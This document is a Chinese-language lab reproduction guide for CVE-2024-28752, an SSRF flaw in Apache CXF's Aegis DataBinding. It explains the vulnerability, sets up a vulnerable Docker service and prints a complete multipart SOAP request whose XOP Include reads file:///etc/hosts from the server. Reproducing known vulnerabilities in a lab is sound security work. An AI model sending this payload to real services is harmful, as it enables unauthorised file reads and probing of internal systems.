# Apache CXF Aegis DataBinding 服务端请求伪造漏洞 (CVE-2024-28752)

Apache CXF 是一个开源的服务框架，帮助开发者使用 JAX-WS 和 JAX-RS 等前端编程 API 构建和开发服务。

Apache CXF 在 4.0.4、3.6.3 和 3.5.8 版本之前存在一个使用 Aegis
DataBinding 的 SSRF 漏洞，该漏洞允许攻击者对接受至少一个任意类型参数的 Web 服务执行 SSRF 攻击。此漏洞专门影响使用 Aegis
DataBinding 的服务，而使用其他数据绑定 (包括默认数据绑定) 的服务不受影响。攻击者可以利用此漏洞通过让服务器向任意 URL
发送请求来访问内部资源，这可能导致信息泄露或对内部系统的进一步攻击。

参考链接：

- <https://github.com/advisories/GHSA-qmgx-j96g-4428>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-28752>
- <https://github.com/ReaJason/CVE-2024-28752>

## 环境搭建

执行如下命令启动一个存在漏洞的 Apache CXF Web 服务，该服务使用 Aegis DataBinding：

```
docker compose up -d
```

服务启动后，存在漏洞的 CXF Web 服务将可以通过 `http://your-ip:8080/test?wsdl` 访问。该服务配置为使用 Aegis
DataBinding 并接受各种参数类型，使其容易受到 SSRF 攻击。

## 漏洞复现

发送如下请求即可触发 SSRF 读取 `/etc/hosts` 文件内容：

```
POST /test HTTP/1.1
Host: your-ip:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close

------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count>
</arg0>
      </web:test>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--
```

![1.png](1.png)
